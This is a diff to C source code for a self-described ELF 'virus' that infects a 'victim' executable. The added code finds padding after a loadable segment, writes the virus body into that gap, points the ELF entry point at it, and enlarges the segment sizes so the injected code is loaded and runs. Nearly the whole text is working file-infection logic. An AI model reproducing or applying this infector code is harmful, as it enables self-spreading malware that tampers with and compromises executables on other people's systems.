@@ -114,7 +114,7 @@ static inline void memcpy(long src_addr, long dst_addr, long size)
 	}
 }
 
-void _start(void) __attribute__((aligned(8)));
+void _start(void) __attribute__((aligned(16)));
 
 void _start(void)
 {
@@ -122,9 +122,10 @@ label1: ;
 	char a[5];
 	volatile Elf64_Ehdr ehdr;
 	volatile Elf64_Phdr phdr;
-	volatile char buf[4096];
+	volatile Elf64_Phdr phdr_next;
 	unsigned long offset;
 	unsigned long code_size;
+	unsigned long real_code_size;
 	Elf64_Half p;
 
 	a[0] = 'a';
@@ -153,20 +154,33 @@ label1: ;
 	for (p = 0; p < ehdr.e_phnum; ++p) {
 		read(fd, &phdr, sizeof(phdr));
 		if (phdr.p_type != PT_LOAD) { continue; }
-
-		/* _start in victim */
-		offset = ehdr.e_entry - phdr.p_vaddr;
+		read(fd, &phdr_next, sizeof(phdr));
 
 		/* Count size of _start function of virus */
-		code_size = &&label2 - &&label1;
-		lseek(fd, offset, SEEK_SET);
-		/* add code */
-		memcpy((long)&_start, (long)buf, code_size);
-		write(fd, (long)buf, code_size);
+		code_size = 2048;
+		real_code_size = &&label2 - &&label1;
+
+		if ((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz) >= real_code_size)) {
+			/* Padding in victim */
+			offset = phdr.p_offset + phdr.p_filesz;
+			lseek(fd, offset, SEEK_SET);
+			/* add code */
+			write(fd, (long)_start, real_code_size);
+
+			/* change elf header entry point */
+			ehdr.e_entry = phdr.p_vaddr + phdr.p_filesz;
+			lseek(fd, 0, SEEK_SET);
+			write(fd, &ehdr, sizeof(ehdr));
+
+			/* change phdr */
+			phdr.p_filesz += code_size;
+			phdr.p_memsz += code_size;
+			lseek(fd, ehdr.e_phoff + (p * sizeof(phdr)), SEEK_SET);
+			write(fd, &phdr, sizeof(phdr));
+		}
 
 		break;
 	}	
-
 	close(fd);
 	_exit(0);
 label2: ;
